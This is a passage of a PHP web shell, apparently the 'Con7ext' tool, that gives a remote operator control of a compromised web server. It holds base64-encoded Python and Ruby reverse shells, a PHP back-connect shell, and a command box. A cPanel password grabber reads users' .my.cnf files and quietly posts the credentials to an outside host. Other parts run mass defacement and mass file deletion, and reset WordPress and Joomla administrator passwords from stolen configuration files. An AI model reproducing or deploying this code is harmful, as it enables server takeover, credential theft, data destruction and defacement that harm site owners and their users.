$becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
$pbcaa=@fopen('bcpyt.py','w');
fwrite($pbcaa,$becaa);
$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
unlink("bcpyt.py");
}
if($_POST['backconnect'] == 'ruby') {
$becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
$pbcaak=@fopen('bcruby.rb','w');
fwrite($pbcaak,$becaak);
$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
unlink("bcruby.rb");
}
if($_POST['backconnect'] == 'php') {
            $ip = $_POST['server'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip , $port , $errno, $errstr );
            if($errno != 0){
              echo "<font color='red'>$errno : $errstr</font>";
            } else if (!$sockfd)  {
              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
            } else {
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: BackConnect Php By Con7ext ::..
                \n{################################################################}\n");
              $dir = shell_exec("pwd");
              $sysinfo = shell_exec("uname -a");
              $time = Shell_exec("time");
              $len = 1337;
              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
              while(!feof($sockfd)){ $cmdPrompt = '[Con7ext]#:> ';
              fputs ($sockfd , $cmdPrompt );
              $command= fgets($sockfd, $len);
              fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
            }
            fclose($sockfd);
            }
          }
		echo "</p></div>";
} elseif($_GET['jancok'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['jancok'] == 'cmd') {
echo "<center><form method='post'>
	<font style='text-decoration: underline;'>con7ext@".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre><textarea>".exe($_POST['cmd'])."</textarea></pre>";
	}
}
elseif($_GET['jancok'] == 'cpanel') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<br><br><style>
textarea {
resize:none;
color:black;
background-color:#ffffff;  
font-size:8pt; color:black;
border:1px solid white ;
border-left: 4px solid white ;
}
input {
color: black;
border:1px dotted white;
}
</style>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align=center><tr><th valign=top  class=style2> COUNT </th><th valign=top > DOMAIN </th><th valign=top class=style2 > USER </th><th valign=top class=style2 > Password </th><th valign=top class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success3));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
}
}
}
echo '</table>';
$total = $dc;
 
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top class=style2 style=width: 139px>".$count++."</td><td valign=top class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top class=style2 style=width: 139px>'.$r."</td><td valign=top class=style2 style=width: 139px>".$password."</td><td valign=top class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                }
            }
            }
echo '</table>';
$total = $dc;
echo '<br><div class=result valign=top class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}
 
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
} elseif($_GET['jancok'] == 'mass') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$path=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$path=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='ngeue.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Rinto AR</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
}elseif($_GET['mass'] == 'title'){
echo "<center><h1>Mass Title Changer</h1>
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' style='width: 450px;' placeholder='http://jembod.com/con7ext_symconf/'><br>
<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
</form></center>";
if($_POST['gass']) {
    echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
GrabUrl($_POST['linkconf'],'wordpress');   
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By con7ext'><br>POST CONTENT: <input type='text' name='content' value='Hacked By con7ext'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Con7ext'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
</form></center>";
}
if($_POST['edittitle']) {
            $title = htmlspecialchars($_POST['title']);
                $id = $_POST['id'];
                $content = $_POST['content'];
                $postname = $_POST['name'];
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        foreach($link as $dir_config) {
                                $config = anucurl($dir_config);
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
}elseif($_GET['mass'] == 'changer') {
if($_POST['sikat']) {
      echo "<center><h1>Config Reset Password</h1>
    <form method='post'>
    Link Config: <br>
    <textarea name='link' style='width: 450px; height:250px;'>";
    GrabUrl($_POST['linkconfig'],'txt'); 
    echo"</textarea><br>
        User Baru : <input type='text' name='newuser' placeholder='con7ext'> <br><br>
        Password Baru : <input type='text' name='newpasswd' placeholder='con7ext'><br><br>
    <input type='submit' style='width: 450px;' name='masschanger' value='Hajar!!'>
    </form></center>";
  }else {
    echo '<center>
    <h1>Config Reset Password</h1>
    <form method="post">
    </select><br>
    Link Config :<br>
    <input type="text" name="linkconfig" height="10" style="width: 450px;" placeholder="http://jembod.com/con7ext_symconf/"><br>
    <input type="submit" style="width: 450px;" name="sikat" value="Change User!!">
    </form></center>';
  }
  if($_POST['masschanger']) {
    $user = $_POST['newuser'];
    $pass = $_POST['newpasswd'];
    $passx = md5($pass);
    $link = explode("\r\n", $_POST['link']);
    foreach($link as $file_conf) {
      $config = file_get_contents($file_conf);
      if(preg_match("/JConfig|joomla/",$config)) {
        $dbhost = ambilkata($config,"host = '","'");
        $dbuser = ambilkata($config,"user = '","'");
        $dbpass = ambilkata($config,"password = '","'");
        $dbname = ambilkata($config,"db = '","'");
        $dbprefix = ambilkata($config,"dbprefix = '","'");
        $prefix = $dbprefix."users";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result['id'];
        $site = ambilkata($config,"sitename = '","'");
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
        echo "CMS: Joomla<br>";
        if($site == '') {
          echo "Sitename => <font color=red>Error Cok</font><br>";
        } else {
          echo "Sitename => $site<br>";
        }
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/WordPress/",$config)) {
        $dbhost = ambilkata($config,"DB_HOST', '","'");
        $dbuser = ambilkata($config,"DB_USER', '","'");
        $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"DB_NAME', '","'");
        $dbprefix = ambilkata($config,"table_prefix  = '","'");
        $prefix = $dbprefix."users";
        $option = $dbprefix."options";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[ID];
        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[option_value];
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE id='$id'");
        echo "CMS: Wordpress<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
